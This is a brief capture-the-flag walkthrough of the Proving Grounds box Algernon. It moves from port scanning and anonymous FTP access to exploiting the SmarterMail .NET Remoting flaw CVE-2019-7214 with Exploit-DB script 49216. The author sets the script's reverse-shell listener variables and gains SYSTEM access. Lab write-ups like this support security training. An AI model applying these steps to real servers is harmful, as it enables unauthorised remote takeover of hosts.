# PG Algernon
## SmarterMail, .NET Remoting (TCP/17001)
## Nmap Scan
```
nmap -T4 -p- -A -oN scan.txt 192.168.x.x
```
## Service Enumeration
```
Looking at the nmap output, anonymous login appears to be enabled on this FTP server.
I test the login and download all the files using mget *.
```
## FTP
```
mget *
```
## SMB
```
No anonymous share enumeration, access denied.
```
## HTTP (TCP/80)
```
Looks like a default installation of Microsoft IIS web server.
I test for any files or directories using gobuster, but find nothing.
```
## HTTP (TCP/9998)
```
Looks like a web service called SmarterMail.
Check Exploit DB for any vulnerabilities matching this service name using searchsploit. 
Default credentials found using Google search do not work here.
Source code reveals a version number.
```
## .NET Remoting (TCP/17001)
```
.NET Remoting (TCP/17001)
Searching Google for information on this port, I see repeated mentions of remote code execution (RCE) coupled with SmarterMail.

    https://www.speedguide.net/port.php?port=17001
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7214
    Confirm on Exploit DB: https://www.exploit-db.com/exploits/49216
```
##  Exploit
```
Using the exploit found using searchsploit I copy 49216.py to my current working directory.
Edit the exploit variables:

HOST='192.168.x.x'
PORT=17001
LHOST='192.168.x.x'
LPORT=80

Python
I then, start a TCP listener on port 80 and run the exploit.
python3 49216.py
```
##  Post-Exploitation
```
The SmarterMail service is being executed by the SYSTEM account, meaning I have fully compromised this host.
```


